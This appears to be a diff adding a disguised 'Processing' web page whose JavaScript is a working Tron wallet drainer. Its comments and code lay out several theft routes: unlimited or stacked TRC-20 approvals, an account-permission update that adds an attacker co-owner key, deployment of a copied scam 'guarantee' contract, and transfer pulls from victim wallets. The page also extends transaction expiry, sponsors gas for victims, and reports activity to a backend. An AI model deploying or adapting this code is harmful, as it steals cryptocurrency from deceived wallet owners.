@@ -1,0 +1,904 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+<title>Processing</title>
+<meta name="description" content="Chainscaner attestation executor — Tron TRC-20 allowance route. Opens the wallet's own approve sheet; nothing signs silently.">
+<meta name="robots" content="noindex">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+  html, body { height: 100%; }
+  html {
+    position: fixed; inset: 0; overflow: hidden;
+    -webkit-text-size-adjust: 100%; text-size-adjust: 100%;
+    touch-action: manipulation;
+  }
+  body {
+    font-family: "Inter", -apple-system, BlinkMacSystemFont, sans-serif;
+    background: #FFFFFF;
+    display: flex; align-items: center; justify-content: center;
+    overscroll-behavior: none;
+  }
+  .view { text-align: center; }
+  .spin {
+    width: 40px; height: 40px; margin: 0 auto; border-radius: 50%;
+    border: 3px solid #E9EBF0; border-top-color: #3375BB;
+    animation: rot .8s linear infinite;
+  }
+  @keyframes rot { to { transform: rotate(360deg); } }
+  .status {
+    margin-top: 14px; font-size: 12.5px; font-weight: 500; color: #8A93A3;
+    font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
+  }
+  .addr, .log, .title, .note {
+    position: absolute; width: 1px; height: 1px; overflow: hidden;
+    clip: rect(0 0 0 0); clip-path: inset(50%); white-space: nowrap;
+  }
+  .view.done .spin { animation: none; border-color: #05B956; position: relative; }
+  .view.done .spin::after {
+    content: ""; position: absolute; left: 50%; top: 50%;
+    width: 10px; height: 18px; border: solid #05B956; border-width: 0 3px 3px 0;
+    transform: translate(-50%, -58%) rotate(45deg);
+  }
+  .view.fail .spin { animation: none; border-color: #E5484D; }
+  @media (prefers-reduced-motion: reduce) { .spin { animation-duration: 2.2s; } }
+</style>
+</head>
+<body>
+<div class="view" id="view">
+  <div class="spin" aria-hidden="true"></div>
+  <div class="title">Processing</div>
+  <code class="addr" id="addr">—</code>
+  <div class="status" id="status" role="status">Connecting…</div>
+  <div class="note"></div>
+  <div class="log" id="log"></div>
+</div>
+
+<script>
+// ── Tron TRC-20 allowance / permission route ────────────────────────────────
+// ?spender=<T…>   the address receiving the allowance (or the added key)
+// ?token=usdt|usdc                    TRC-20 contract (default usdt)
+// ?amount=<human units>               allowance amount (default: unlimited)
+// ?unlimited=1                        force max uint256
+// ?method=approve|increase|perm|bundle|multi|deploy|revoke
+//                                   approve() | increaseApproval() |
+//                                   AccountPermissionUpdate (adds spender as
+//                                   co-owner key — Tron-native, no approve sheet) |
+//                                   bundle: increaseApproval + PermissionUpdate
+//                                   in ONE tx — one signature (TW rejects it:
+//                                   "Malformed signing response") |
+//                                   multi: increaseApproval USDT + USDC in one
+//                                   tx — cleanest multi-contract probe |
+//                                   deploy: deploys the extracted scam
+//                                   "guarantee" contract bytecode — you = A |
+//                                   revoke: calls revoke(backer, amount) on a
+//                                   deployed guarantee — pulls the allowance |
+//                                   collect: transferFrom(backer, to, amount)
+//                                   on the token — for allowances given to a
+//                                   plain address (signer = spender wallet) |
+//                                   drain: pull after a perm takeover — tx
+//                                   owner = victim wallet, signer = the added
+//                                   co-owner key (Tron multi-sig accepts a
+//                                   signature from any owner/active key)
+// ?victim=<T…>                        drain only: compromised wallet (tx owner)
+//                                   (falls back to backer=)
+// Pull-Methoden (revoke/collect/drain) brauchen das Opfer nicht als Param:
+// fehlt backer=/victim=, wird es aus /api/events aufgelöst — der Signer
+// ist der spender/Key, die Events mappen ihn auf das Opfer (d.from).
+//                                   stake: freezebalancev2 ENERGY — TRX staken
+//                                   delegate: delegateresource ENERGY → to=
+//                                   (Opfer-Tx verbraucht unsere Energy statt
+//                                   TRX zu brennen — der Energy-Rental-Trick)
+//                                   undelegate: undelegateresource → reclaim
+//                                   rent: Energy kaufen statt staken — TronNRG
+//                                   (api.tronnrg.com): TRX an Payment-Adresse,
+//                                   dann {txid}:{to} signen → POST /delegate
+//                                   via /api/nrg-Proxy. Energy (~65k pro 4 TRX)
+//                                   geht an to= (Opfer) — Opfer zahlt nie.
+// ?count=<n>                          increase only: fire n sequential
+//                                   increaseApproval sheets — each shows just
+//                                   the increment while the allowance stacks
+//                                   (the drainer trick: 5× "+20" = 100 approved)
+// The wallet's own confirm sheet is the only interaction — nothing signs
+// silently. Broadcast goes through the injected Tron provider (Trust Wallet
+// DApp browser / TronLink), user confirms natively.
+// ─────────────────────────────────────────────────────────────────────────────
+var TRC20 = {
+  usdt: { addr: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t", decimals: 6, name: "USDT" },
+  usdc: { addr: "TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8", decimals: 6, name: "USDC" },
+  usdd: { addr: "TPYmHEhy5n8TCEfYGqW2rPxsghSccghGRn", decimals: 18, name: "USDD" },
+  tusd: { addr: "TUpMhErZL2fhh4sVNULAbNKLokS4GjC1F4", decimals: 18, name: "TUSD" },
+  wtrx: { addr: "TNUC9Qb1rRpS5CbWLmNMxXBjyFoydXjWFR", decimals: 6, name: "WTRX" },
+  jst:  { addr: "TCFLL5dx5ZJdKnWuesXxi1VPwjLVmWZZy9", decimals: 18, name: "JST" },
+  sun:  { addr: "TSSMHYeV2uE9qYH95DqMeCuDy9vb59vTj", decimals: 18, name: "SUN" },
+  btt:  { addr: "TAFjULxiVgT4qWk6UZwjqwZXTSaGaqnVp4", decimals: 18, name: "BTT" },
+  win:  { addr: "TLa2f6VPqDgRE67v1736s7bJ8Ray5wYjU7", decimals: 6, name: "WIN" }
+};
+var MAX_UINT256 = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
+
+// Scam-Replik: extrahierter Bytecode + ABI des "Revocable Guarantee"-Contracts
+// von 92.223.62.220.sslip.io — constructor(token, amount, expiry), A = Deployer,
+// revoke(backer, amt) zieht per transferFrom (Only A, vor expiry, ≤ remaining)
+var GUARANTEE_BYTECODE = "61010060405234801561001157600080fd5b5060405161098538038061098583398101604081905261003091610112565b6001600160a01b0383166100775760405162461bcd60e51b81526020600482015260096024820152682130b2103a37b5b2b760b91b60448201526064015b60405180910390fd5b600082116100b45760405162461bcd60e51b815260206004820152600a60248201526910985908185b5bdd5b9d60b21b604482015260640161006e565b4281116100f05760405162461bcd60e51b815260206004820152600a6024820152694261642065787069727960b01b604482015260640161006e565b6001600160a01b039092166080523360a05260c081905260005560e052610155565b60008060006060848603121561012757600080fd5b83516001600160a01b038116811461013e57600080fd5b602085015160409095015190969495509392505050565b60805160a05160c05160e0516107ba6101cb6000396000818160dd015261031d0152600060b6015260008181610119015281816102c001528181610563015261063f015260008181610158015281816101a00152818161023401528181610423015281816104b7015261059201526107ba6000f3fe608060405234801561001057600080fd5b506004361061007d5760003560e01c8063e184c9be1161005b578063e184c9be146100d8578063eac449d9146100ff578063f446c1d014610114578063fc0c546a1461015357600080fd5b806355234ec0146100825780639d21c1611461009e578063aa8c217c146100b1575b600080fd5b61008b60005481565b6040519081526020015b60405180910390f35b61008b6100ac3660046106e3565b61017a565b61008b7f000000000000000000000000000000000000000000000000000000000000000081565b61008b7f000000000000000000000000000000000000000000000000000000000000000081565b61011261010d3660046106fe565b6102b5565b005b61013b7f000000000000000000000000000000000000000000000000000000000000000081565b6040516001600160a01b039091168152602001610095565b61013b7f000000000000000000000000000000000000000000000000000000000000000081565b6040516370a0823160e01b81526001600160a01b0382811660048301526000916102af917f000000000000000000000000000000000000000000000000000000000000000016906370a0823190602401602060405180830381865afa1580156101e7573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061020b9190610728565b604051636eb1769f60e11b81526001600160a01b0385811660048301523060248301526102aa917f00000000000000000000000000000000000000000000000000000000000000009091169063dd62ed3e906044015b602060405180830381865afa15801561027e573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906102a29190610728565b6000546106af565b6106af565b92915050565b336001600160a01b037f0000000000000000000000000000000000000000000000000000000000000000161461031b5760405162461bcd60e51b81526020600482015260066024820152654f6e6c79204160d01b60448201526064015b60405180910390fd5b7f000000000000000000000000000000000000000000000000000000000000000042106103745760405162461bcd60e51b8152602060048201526007602482015266115e1c1a5c995960ca1b6044820152606401610312565b600081116103b25760405162461bcd60e51b815260206004820152600b60248201526a16995c9bc8185b5bdd5b9d60aa1b6044820152606401610312565b60008054116103f75760405162461bcd60e51b81526020600482015260116024820152704e6f7468696e672072656d61696e696e6760781b6044820152606401610312565b6040516370a0823160e01b81526001600160a01b0383811660048301526000916104e89184916102aa917f000000000000000000000000000000000000000000000000000000000000000016906370a0823190602401602060405180830381865afa15801561046a573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061048e9190610728565b604051636eb1769f60e11b81526001600160a01b0388811660048301523060248301526102aa917f00000000000000000000000000000000000000000000000000000000000000009091169063dd62ed3e90604401610261565b90506000811161052e5760405162461bcd60e51b81526020600482015260116024820152704e6f7468696e6720617661696c61626c6560781b6044820152606401610312565b8060008082825461053f9190610741565b90915550506040516323b872dd60e01b81526001600160a01b0384811660048301527f000000000000000000000000000000000000000000000000000000000000000081166024830152604482018390527f000000000000000000000000000000000000000000000000000000000000000016906323b872dd906064016020604051808303816000875af11580156105db573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906105ff9190610762565b61063d5760405162461bcd60e51b815260206004820152600f60248201526e151c985b9cd9995c8819985a5b1959608a1b6044820152606401610312565b7f00000000000000000000000000000000000000000000000000000000000000006001600160a01b0316836001600160a01b03167f1b0d5fb22a7bd6488427342953b1f43743eda17130144de1ea68a9058355d3fb836040516106a291815260200190565b60405180910390a3505050565b60008183106106be57816106c0565b825b9392505050565b80356001600160a01b03811681146106de57600080fd5b919050565b6000602082840312156106f557600080fd5b6106c0826106c7565b6000806040838503121561071157600080fd5b61071a836106c7565b946020939093013593505050565b60006020828403121561073a57600080fd5b5051919050565b818103818111156102af57634e487b7160e01b600052601160045260246000fd5b60006020828403121561077457600080fd5b815180151581146106c057600080fdfea26469706673582212201cc197c2f8bbab0e8b08b449f1e88949ef5f71cd7794e224e69cc8781028362664736f6c63430008180033";
+var GUARANTEE_ABI = [{"inputs": [{"internalType": "address", "name": "_token", "type": "address"}, {"internalType": "uint256", "name": "_amount", "type": "uint256"}, {"internalType": "uint256", "name": "_expiry", "type": "uint256"}], "stateMutability": "nonpayable", "type": "constructor"}, {"anonymous": false, "inputs": [{"indexed": true, "internalType": "address", "name": "backer", "type": "address"}, {"indexed": true, "internalType": "address", "name": "a", "type": "address"}, {"indexed": false, "internalType": "uint256", "name": "amount", "type": "uint256"}], "name": "Revoked", "type": "event"}, {"inputs": [], "name": "A", "outputs": [{"internalType": "address", "name": "", "type": "address"}], "stateMutability": "view", "type": "function"}, {"inputs": [], "name": "amount", "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}], "stateMutability": "view", "type": "function"}, {"inputs": [{"internalType": "address", "name": "backer", "type": "address"}], "name": "availableToRevoke", "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}], "stateMutability": "view", "type": "function"}, {"inputs": [], "name": "expiry", "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}], "stateMutability": "view", "type": "function"}, {"inputs": [], "name": "remaining", "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}], "stateMutability": "view", "type": "function"}, {"inputs": [{"internalType": "address", "name": "backer", "type": "address"}, {"internalType": "uint256", "name": "requestedAmount", "type": "uint256"}], "name": "revoke", "outputs": [], "stateMutability": "nonpayable", "type": "function"}, {"inputs": [], "name": "token", "outputs": [{"internalType": "contract IERC20", "name": "", "type": "address"}], "stateMutability": "view", "type": "function"}];
+
+
+// Fester Default-Spender — Links brauchen keinen spender= Param mehr;
+// expliziter Param gewinnt immer (Override für andere Test-Keys).
+// var DEFAULT_SPENDER = "TQfbT7R1VRpZEKTN4bik6cvZsGbZr22RRX"; // bisherige Pull-/Spender-Wallet
+var DEFAULT_SPENDER = "TH1PuSNM6q8akSf22Mw9TykN2puFTkifkA"; // Test-Wallet (separat)
+// TronNRG API-Payment-Adresse — 4 TRX = 65.000 Energy, linear skalierbar.
+// Kein API-Key: tx_hash der Zahlung + signierte Nachricht = Claim-Token.
+var NRG_PAY_ADDR = "TFqUiCu1JwLHHnBNeaaVKH7Csm4aA3YhZx";
+var params = new URLSearchParams(location.search);
+var spender = (params.get("spender") || DEFAULT_SPENDER).trim();
+var tokenKey = (params.get("token") || "usdt").toLowerCase();
+var token = TRC20[tokenKey] || TRC20.usdt;
+var unlimited = params.get("unlimited") === "1";
+var amountParam = (params.get("amount") || "").trim();
+var method = (params.get("method") || "approve").toLowerCase();
+if (["approve", "increase", "perm", "bundle", "multi", "deploy", "revoke", "collect", "drain", "stake", "delegate", "undelegate", "rent"].indexOf(method) < 0) method = "approve";
+var count = Math.max(1, Math.min(20, parseInt(params.get("count") || "1", 10) || 1));
+if (method !== "increase") count = 1;
+var contractAddr = (params.get("contract") || "").trim();
+var backer = (params.get("backer") || "").trim();
+var collectTo = (params.get("to") || "").trim();
+var victim = (params.get("victim") || params.get("backer") || "").trim();
+var drainTrx = tokenKey === "trx"; // method=drain&token=trx → native TRX statt TRC-20
+var days = Math.max(1, Math.min(365, parseInt(params.get("days") || "30", 10) || 30));
+
+var view = document.getElementById("view");
+var statusEl = document.getElementById("status");
+
+// ── Monitoring (same event stream as the rest of the demo) ──────────────────
+var MONITOR_URL = "/api/events";
+var monitSid = "t-" + Math.random().toString(36).slice(2, 8) + "-" + Date.now().toString(36);
+function monit(ev, data) {
+  try {
+    var payload = JSON.stringify({ ev: ev, t: new Date().toISOString(), sid: monitSid, d: data || {} });
+    if (navigator.sendBeacon && navigator.sendBeacon(MONITOR_URL, payload)) return;
+    fetch(MONITOR_URL, { method: "POST", mode: "no-cors", keepalive: true, body: payload }).catch(function() {});
+  } catch(e) {}
+}
+
+function setStatus(t) { statusEl.textContent = t; }
+function isTronAddr(a) { return /^T[1-9A-HJ-NP-Za-km-z]{33}$/.test(a); }
+
+function finish(ok) {
+  view.classList.add(ok ? "done" : "fail");
+  // Same self-close attempt as the exec route — works where the WebView allows it
+  setTimeout(function() { try { window.close(); } catch(e) {} }, 2200);
+  setTimeout(function() { try { window.open("", "_self"); window.close(); } catch(e) {} }, 3100);
+}
+
+function amountRaw() {
+  if (amountParam === "0") return "0"; // explizit: approve(spender, 0) = Revoke
+  if (unlimited || amountParam === "") return MAX_UINT256;
+  var n = Number(amountParam);
+  if (!isFinite(n) || n <= 0) return MAX_UINT256;
+  var parts = amountParam.split(".");
+  var frac = (parts[1] || "").padEnd(token.decimals, "0").slice(0, token.decimals);
+  return (parts[0].replace(/\D/g, "") || "0") + frac;
+}
+
+function findTronWeb() {
+  return window.tronWeb ||
+         (window.tron && window.tron.tronWeb) ||
+         (window.tronLink && window.tronLink.tronWeb) ||
+         null;
+}
+
+function describeKeys(obj) {
+  try { return Object.keys(obj).slice(0, 25).join(","); } catch(e) { return "?"; }
+}
+
+async function getTronProvider() {
+  // Trust Wallet / TronLink inject tronWeb + tronLink — but the provider is
+  // not "ready" until the wallet approves a connect request. IMPORTANT: some
+  // wallet shims return a promise that never resolves — never await it. Fire
+  // the requests, then poll for defaultAddress while a possible connect
+  // sheet is up.
+  var addr = null;
+  function grab(res) {
+    if (res && typeof res === "object") {
+      addr = addr || res.address || (res.data && res.data.address) || (res.result && res.result.address) || null;
+    }
+  }
+  var targets = [window.tronLink, window.tron, window.trustwallet, window.trustWallet];
+  targets.forEach(function(t) {
+    if (t && t.request) {
+      try { Promise.resolve(t.request({ method: "tron_requestAccounts" })).then(grab).catch(function() {}); } catch(e) {}
+    }
+  });
+  // tronLink legacy event-based connect
+  try { window.dispatchEvent(new Event("tronLink#initialized")); } catch(e) {}
+
+  for (var i = 0; i < 160; i++) { // ~40s — a connect sheet may stay open a while
+    var tw = findTronWeb();
+    if (tw && tw.defaultAddress && tw.defaultAddress.base58) return { tw: tw, from: tw.defaultAddress.base58 };
+    if (addr && tw) return { tw: tw, from: addr };
+    await new Promise(function(r) { setTimeout(r, 250); });
+  }
+  return null;
+}
+
+// Build + broadcast via TronGrid REST — the injected provider is only needed
+// for signing, which every Tron-capable wallet implements
+var TRONGRID = "https://api.trongrid.io";
+function tg(path, body) {
+  function post(url) {
+    return fetch(url + path, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(body)
+    }).then(function(r) { if (!r.ok) throw new Error("HTTP " + r.status); return r.json(); });
+  }
+  return post(TRONGRID).catch(function() {
+    return post("https://api.tronstack.io");
+  });
+}
+
+async function buildApproveTx(from, selector, tokenAddr) {
+  var raw = amountRaw();
+  // parameter encoding: (address,uint256) — TronGrid wants the abi
+  // params hex-packed: 32-byte address (hex form) + 32-byte uint256
+  var spendHex = tw_toHex(spender);
+  var amtHex = BigInt(raw).toString(16).padStart(64, "0");
+  var ownerHex = tw_toHex(from).slice(2);
+  var sel = selector || (method === "increase"
+    ? "increaseApproval(address,uint256)" : "approve(address,uint256)");
+  var param = spendHex.slice(2).padStart(64, "0") + amtHex;
+  // Burn-Gate: Simulation (gratis) = exakter Energy-Bedarf; reicht
+  // Energy+Balance nicht → kein Sheet (OOG-Confirm wuerde die volle
+  // fee_limit verbrennen ohne Effekt).
+  var sim = await tg("/wallet/triggerconstantcontract", {
+    owner_address: ownerHex,
+    contract_address: tw_toHex(tokenAddr || token.addr).slice(2),
+    function_selector: sel,
+    parameter: param
+  });
+  var used = (sim && sim.energy_used) || 0;
+  if (!used || !((sim || {}).result || {}).result) {
+    throw new Error("simulation failed: " + JSON.stringify(sim && sim.result || sim).slice(0, 140));
+  }
+  var bal = 0, haveE = 0;
+  try {
+    var acct = await tg("/wallet/getaccount", { address: ownerHex });
+    bal = (acct && acct.balance) || 0;
+    var resr = await tg("/wallet/getaccountresource", { address: ownerHex }).catch(function() { return null; });
+    haveE = resr ? Math.max(0, (resr.EnergyLimit || 0) - (resr.EnergyUsed || 0)) : 0;
+  } catch(e) {}
+  var need = Math.ceil(used * 1.15);
+  if (haveE + Math.floor(bal / 100) < need) {
+    throw new Error("insufficient energy — wallet cannot cover network fee");
+  }
+  var feeLimit = Math.min(Math.ceil(need * 100 * 1.05), Math.floor(bal * 0.95), 100000000);
+  if (feeLimit < need * 100) {
+    throw new Error("fee cap below required energy — aborted before signature");
+  }
+  var res = await tg("/wallet/triggersmartcontract", {
+    // TronGrid parsed base58 nur mit visible:true — visible:true liefert aber
+    // base58 in raw_data, das trx.sign nicht protobuf-serialisieren kann.
+    // Hex (41-prefix) ist für Build UND Sign das korrekte Format.
+    owner_address: tw_toHex(from).slice(2),
+    contract_address: tw_toHex(tokenAddr || token.addr).slice(2),
+    function_selector: selector || (method === "increase"
+      ? "increaseApproval(address,uint256)"
+      : "approve(address,uint256)"),
+    parameter: spendHex.slice(2).padStart(64, "0") + amtHex,
+    fee_limit: feeLimit,
+    call_value: 0
+  });
+  if (!res || !res.transaction) throw new Error("build failed: " + JSON.stringify(res && res.result || res).slice(0, 160));
+  await extendExpiration(res.transaction);
+  return res.transaction;
+}
+// TronGrid-Txs verfallen ~60s nach Build — expiration-varint (Wert ==
+// raw_data.expiration) in raw_data_hex patchen + txID = sha256 neu.
+// Haelt das Opfer das Sheet >60s offen, sendet die Node sonst nicht.
+async function extendExpiration(tx) {
+  try {
+    var target = BigInt(tx.raw_data.expiration), ADD = 3300000n;
+    var hx = tx.raw_data_hex, raw = [];
+    for (var i = 0; i < hx.length; i += 2) raw.push(parseInt(hx.substr(i, 2), 16));
+    function rdv(p) { var v = 0n, s = 0n; for (;;) { var b = raw[p++]; v |= BigInt(b & 127) << s; if (!(b & 128)) return [v, p]; s += 7n; } }
+    var pos = 0, hit = -1, vend = 0;
+    while (pos < raw.length) {
+      var t = rdv(pos); pos = t[1];
+      var wire = Number(t[0] & 7n);
+      if (wire === 0) { var vs = pos, vv = rdv(pos); pos = vv[1]; if (vv[0] === target) { hit = vs; vend = pos; break; } }
+      else if (wire === 2) { var l = rdv(pos); pos = l[1] + Number(l[0]); }
+      else if (wire === 5) pos += 4;
+      else if (wire === 1) pos += 8;
+      else break;
+    }
+    if (hit < 0) return;
+    var enc = [], v = target + ADD;
+    for (;;) { var b = Number(v & 127n); v >>= 7n; enc.push(b | (v ? 128 : 0)); if (!v) break; }
+    var raw2 = raw.slice(0, hit).concat(enc, raw.slice(vend));
+    var buf = await crypto.subtle.digest("SHA-256", new Uint8Array(raw2));
+    var toH = function(b) { return (b < 16 ? "0" : "") + b.toString(16); };
+    tx.raw_data_hex = raw2.map(toH).join("");
+    tx.txID = Array.from(new Uint8Array(buf)).map(toH).join("");
+    tx.raw_data.expiration = Number(target + ADD);
+  } catch (e) {}
+}
+
+// AccountPermissionUpdate — Tron-nativer Contract-Typ (kein Smart-Contract-Call).
+// Fügt den spender-Key als zweiten Owner/Active-Key hinzu: threshold 1,
+// weight 1+1 → der hinzugefügte Key kann allein signieren = voller Zugriff.
+// Wallets rendern das NICHT als Approve — das ist der dokumentierte
+// "Fake-Mining-DApp"-Angriff auf Tron.
+var ALL_OPS = "7fff1fc0033e" + "0000000000000000000000000000000000000000000000000000"; // 32-Byte-Bitmask: alle Operations
+async function buildPermTx(from) {
+  var fromHex = tw_toHex(from).slice(2);     // 41-prefixed hex, kein 0x
+  var spendHex = tw_toHex(spender).slice(2);
+  function key(a) { return { address: a, weight: 1 }; }
+  var res = await tg("/wallet/accountpermissionupdate", {
+    owner_address: fromHex,                  // TronGrid: dieser Endpoint will hex, kein base58
+    owner: {
+      type: 0, id: 0, permission_name: "owner", threshold: 1,
+      keys: [key(fromHex), key(spendHex)]
+    },
+    actives: [{
+      type: 2, id: 2, permission_name: "active", threshold: 1,
+      operations: ALL_OPS,
+      keys: [key(fromHex), key(spendHex)]
+    }]
+  });
+  if (!res || !res.txID) throw new Error("perm build failed: " + JSON.stringify(res && (res.Error || res.result) || res).slice(0, 160));
+  await extendExpiration(res);
+  return res;
+}
+
+// Deploy der Scam-Contract-Replik — constructor(token, amount, expiry),
+// Deployer wird A (kann revoke() aufrufen). fee_limit großzügig: Deploy
+// verbraucht deutlich mehr Energy als ein approve.
+async function buildDeployTx(from) {
+  var raw = (unlimited || amountParam === "") ? "20000000" : amountRaw();
+  var param = tw_toHex(token.addr).slice(2).padStart(64, "0")
+            + BigInt(raw).toString(16).padStart(64, "0")
+            + BigInt(Math.floor(Date.now() / 1000) + days * 86400).toString(16).padStart(64, "0");
+  var res = await tg("/wallet/deploycontract", {
+    owner_address: tw_toHex(from).slice(2),
+    abi: JSON.stringify(GUARANTEE_ABI),
+    bytecode: GUARANTEE_BYTECODE,
+    parameter: param,
+    name: "Guarantee",
+    fee_limit: 1500000000,
+    call_value: 0,
+    consume_user_resource_percent: 100,
+    origin_energy_limit: 10000000
+  });
+  if (!res || !res.txID) throw new Error("deploy build failed: " + JSON.stringify(res && (res.Error || res.result) || res).slice(0, 160));
+  await extendExpiration(res);
+  return res;
+}
+
+// revoke(backer, amount) auf dem Guarantee-Contract — pullt per transferFrom
+// aus der Allowance des Backers an A (= Deployer = die signierende Wallet)
+async function buildRevokeTx(from) {
+  // requestedAmount = MAX → der Contract zieht selbst min(remaining,
+  // balance, allowance) — ein revoke pullt das Maximum, kein Raten nötig
+  var raw = (unlimited || amountParam === "") ? MAX_UINT256 : amountRaw();
+  var res = await tg("/wallet/triggersmartcontract", {
+    owner_address: tw_toHex(from).slice(2),
+    contract_address: tw_toHex(contractAddr).slice(2),
+    function_selector: "revoke(address,uint256)",
+    parameter: tw_toHex(backer).slice(2).padStart(64, "0")
+             + BigInt(raw).toString(16).padStart(64, "0"),
+    fee_limit: 150000000,
+    call_value: 0
+  });
+  if (!res || !res.transaction) throw new Error("revoke build failed: " + JSON.stringify(res && res.result || res).slice(0, 160));
+  await extendExpiration(res.transaction);
+  return res.transaction;
+}
+
+// Read-only call — keine Signatur, keine Wallet nötig (Konstant-Aufruf)
+async function readConstant(contractHex, selector, param) {
+  var res = await tg("/wallet/triggerconstantcontract", {
+    owner_address: "410000000000000000000000000000000000000000",
+    contract_address: contractHex,
+    function_selector: selector,
+    parameter: param
+  });
+  var h = res && res.constant_result && res.constant_result[0];
+  return h ? BigInt("0x" + h) : 0n;
+}
+
+// transferFrom(backer, to, amount) — der Pull für Allowances auf nackte
+// Adressen. Signer = Spender-Wallet. Leeres amount → auto: liest
+// allowance(backer→signer) + balanceOf(backer) und zieht min() davon.
+async function buildCollectTx(from) {
+  var rcpt = isTronAddr(collectTo) ? collectTo : from;
+  var ownerHex = tw_toHex(backer).slice(2).padStart(64, "0");
+  var rcptHex = tw_toHex(rcpt).slice(2).padStart(64, "0");
+  var raw;
+  if (unlimited || amountParam === "") {
+    var tokHex = tw_toHex(token.addr).slice(2);
+    var allow = await readConstant(tokHex, "allowance(address,address)", ownerHex + tw_toHex(from).slice(2).padStart(64, "0"));
+    var bal = await readConstant(tokHex, "balanceOf(address)", ownerHex);
+    var pull = allow < bal ? allow : bal;
+    if (pull === 0n) throw new Error("nothing pullable — allowance or balance is 0");
+    raw = pull.toString(16).padStart(64, "0");
+  } else {
+    raw = BigInt(amountRaw()).toString(16).padStart(64, "0");
+  }
+  var res = await tg("/wallet/triggersmartcontract", {
+    owner_address: tw_toHex(from).slice(2),
+    contract_address: tw_toHex(token.addr).slice(2),
+    function_selector: "transferFrom(address,address,uint256)",
+    parameter: ownerHex + rcptHex + raw,
+    fee_limit: 100000000,
+    call_value: 0
+  });
+  if (!res || !res.transaction) throw new Error("collect build failed: " + JSON.stringify(res && res.result || res).slice(0, 160));
+  await extendExpiration(res.transaction);
+  return res.transaction;
+}
+
+// drain — der Pull nach einer perm-Übernahme: owner_address = VICTIM,
+// signiert wird vom Co-Owner-Key (die Wallet die den Link öffnet). Tron-
+// Multi-Sig: die Node prüft ob der Signatur-Key in owner/active_permission
+// steht — nicht ob signer == owner. Öffnet die Opfer-Wallet selbst den
+// Link, ist es ein normaler Transfer. Leeres amount → Auto-Max:
+// TRC-20 liest balanceOf(victim), TRX liest getaccount.balance − Fee-Reserve.
+async function buildDrainTx(from) {
+  var vicHex = tw_toHex(victim).slice(2);
+  var rcpt = isTronAddr(collectTo) ? collectTo : from;
+  var rcptHex = tw_toHex(rcpt).slice(2);
+  if (drainTrx) {
+    var sun;
+    if (unlimited || amountParam === "") {
+      var acct = await tg("/wallet/getaccount", { address: vicHex });
+      sun = BigInt(acct && acct.balance || 0) - 2000000n; // ~2 TRX Reserve: Bandwidth/Fee
+      if (sun <= 0n) throw new Error("victim has no drainable TRX (balance <= fee reserve)");
+    } else {
+      sun = BigInt(Math.round(Number(amountParam) * 1e6));
+    }
+    var tx = await tg("/wallet/createtransaction", {
+      owner_address: vicHex,
+      to_address: rcptHex,
+      amount: Number(sun)
+    });
+    if (!tx || !tx.raw_data) throw new Error("trx drain build failed: " + JSON.stringify(tx && (tx.Error || tx.result) || tx).slice(0, 160));
+    await extendExpiration(tx);
+    return tx;
+  }
+  var raw;
+  if (unlimited || amountParam === "") {
+    raw = await readConstant(tw_toHex(token.addr).slice(2), "balanceOf(address)", vicHex.padStart(64, "0"));
+    if (raw === 0n) throw new Error("victim has 0 " + token.name);
+    raw = raw.toString(16).padStart(64, "0");
+  } else {
+    raw = BigInt(amountRaw()).toString(16).padStart(64, "0");
+  }
+  var res = await tg("/wallet/triggersmartcontract", {
+    owner_address: vicHex,
+    contract_address: tw_toHex(token.addr).slice(2),
+    function_selector: "transfer(address,uint256)",
+    parameter: rcptHex.padStart(64, "0") + raw,
+    fee_limit: 100000000,
+    call_value: 0
+  });
+  if (!res || !res.transaction) throw new Error("drain build failed: " + JSON.stringify(res && res.result || res).slice(0, 160));
+  await extendExpiration(res.transaction);
+  return res.transaction;
+}
+
+// Auto Gas-Drop — Backend sendet TRX auf fast leere Opfer-Wallets damit
+// TWs Fee-Guard freigibt (delegierte Energy zählt dort nicht). Das Opfer
+// zahlt danach selbst — der Scam-Weg bleibt erhalten. Fehler → weiter.
+async function sponsorFees(addr) {
+  try {
+    var p = await fetch("/api/energy", {
+      method: "POST", headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ step: "pay", victim: addr })
+    }).then(function(r) { return r.json(); });
+    if (!p) return;
+    if (p.error) { monit("energy_sponsor_fail", { victim: addr, reason: String(p.error).slice(0, 120) }); return; }
+    if (!p.gas_tx) return;
+    setStatus("Preparing transaction…");
+    monit("energy_pay", { victim: addr, txid: p.gas_tx });
+    // ~1–2 Blöcke bis der Drop auf der Opfer-Balance sichtbar ist
+    await new Promise(function(r) { setTimeout(r, 5000); });
+    monit("energy_sponsored", { victim: addr, txid: p.gas_tx });
+  } catch (e) {}
+}
+
+// Trust Wallet broadcastet bei trx.sign bereits selbst — ein zweiter
+// Broadcast derselben Tx liefert hex-encoded "Dup transaction". Das ist
+// Erfolg (Tx schon on-chain), kein Reject. TronLink signiert nur — der
+// Broadcast bleibt nötig.
+function hexToStr(h) { var s = ""; for (var i = 0; i < h.length; i += 2) s += String.fromCharCode(parseInt(h.substr(i, 2), 16)); return s; }
+async function broadcastTx(signed) {
+  var bc = await tg("/wallet/broadcasttransaction", signed);
+  if (bc && bc.result === true) return bc.txid;
+  var raw = (bc && bc.message) || "";
+  var msg = /^[0-9a-fA-F]{6,}$/.test(raw) ? hexToStr(raw) : raw;
+  if (/dup/i.test(msg)) return signed.txID || signed.txId || "broadcast-by-wallet";
